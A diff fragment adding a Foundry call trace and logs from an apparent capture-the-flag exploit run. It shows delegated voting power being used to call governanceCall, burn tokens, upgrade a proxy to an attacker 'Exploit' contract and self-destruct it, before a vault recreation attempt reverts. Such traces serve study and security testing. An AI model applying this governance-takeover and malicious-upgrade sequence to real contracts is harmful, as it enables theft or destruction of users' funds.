+    │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
+    │   │   ├─ [99394] 0xff93d359F8E3dDDF4C52AA2966BdB2bE4eFfeB4f::burn(0x6b0c19296b6C774F8E6D8E01dAfE09Ee40871EcB, 31337 [3.133e4])
+    │   │   │   ├─ [98865] 0x4Ee82d1960243ecbDd5467cc2E7883722372B4b2::burn(0x6b0c19296b6C774F8E6D8E01dAfE09Ee40871EcB, 31337 [3.133e4]) [delegatecall]
+    │   │   │   │   ├─ [26481] → new Burner@0xdBC9Cd2e9C2B389D961AF4267156Fe8E7C2c94F9
+    │   │   │   │   │   └─ ← [Return] 132 bytes of code
+    │   │   │   │   ├─ [30567] 0x6b0c19296b6C774F8E6D8E01dAfE09Ee40871EcB::transfer(Burner: [0xdBC9Cd2e9C2B389D961AF4267156Fe8E7C2c94F9], 31337 [3.133e4])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xff93d359F8E3dDDF4C52AA2966BdB2bE4eFfeB4f, to: Burner: [0xdBC9Cd2e9C2B389D961AF4267156Fe8E7C2c94F9], value: 31337 [3.133e4])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [5121] Burner::destruct()
+    │   │   │   │   │   └─ ← [SelfDestruct] 
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] 
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [0] console::log("Successfully called governanceCall to burn from exploit contract") [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [533] Exploit::owner() [staticcall]
+    │   └─ ← [Return] Exploit: [0x1640c858ECF84d663CdC44FB2171a3CbdC90B336]
+    ├─ [17200] 0xff93d359F8E3dDDF4C52AA2966BdB2bE4eFfeB4f::governanceCall(0x3659cfe60000000000000000000000001640c858ecf84d663cdc44fb2171a3cbdc90b336)
+    │   ├─ [16659] 0x4Ee82d1960243ecbDd5467cc2E7883722372B4b2::governanceCall(0x3659cfe60000000000000000000000001640c858ecf84d663cdc44fb2171a3cbdc90b336) [delegatecall]
+    │   │   ├─ [1473] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::getCurrentVotes(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72) [staticcall]
+    │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
+    │   │   ├─ [13115] 0xff93d359F8E3dDDF4C52AA2966BdB2bE4eFfeB4f::upgradeTo(Exploit: [0x1640c858ECF84d663CdC44FB2171a3CbdC90B336])
+    │   │   │   ├─ [12589] 0x4Ee82d1960243ecbDd5467cc2E7883722372B4b2::upgradeTo(Exploit: [0x1640c858ECF84d663CdC44FB2171a3CbdC90B336]) [delegatecall]
+    │   │   │   │   ├─ [863] 0x6b0c19296b6C774F8E6D8E01dAfE09Ee40871EcB::balanceOf(0xff93d359F8E3dDDF4C52AA2966BdB2bE4eFfeB4f) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [343] Exploit::proxiableUUID() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+    │   │   │   │   ├─ emit Upgraded(implementation: Exploit: [0x1640c858ECF84d663CdC44FB2171a3CbdC90B336])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] 
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [0] console::log("Successfully called upgradeTo from exploit contract") [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [5187] Exploit::selfDestruct()
+    │   └─ ← [SelfDestruct] 
+    ├─ [0] console::log("Successfully called selfDestruct from exploit contract") [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [786] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::vaultFactory() [staticcall]
+    │   └─ ← [Return] 0x10312CdB2A057EfA373e7716c641370CFFb41446
+    ├─ [1022129032] Exploit::reCreateVault(0x10312CdB2A057EfA373e7716c641370CFFb41446)
+    │   ├─ [1022125737] 0x10312CdB2A057EfA373e7716c641370CFFb41446::createVault(0x95b40e9247270d99761bdcc5163a6fcb69a6f383a26d956a4f29ed2a4edda38a)
+    │   │   ├─ [0] → new <unknown>@0xff93d359F8E3dDDF4C52AA2966BdB2bE4eFfeB4f
+    │   │   │   └─ ← [CreateCollision] EvmError: CreateCollision
+    │   │   └─ ← [Revert] EvmError: Revert
+    │   └─ ← [Revert] EvmError: Revert
+    └─ ← [Revert] EvmError: Revert
+
+
+
+== Logs ==
+  Successfully delegated 100_000 ether to player wallet
+  Successfully called governanceCall to burn from exploit contract
+  Successfully called upgradeTo from exploit contract
+  Successfully called selfDestruct from exploit contract
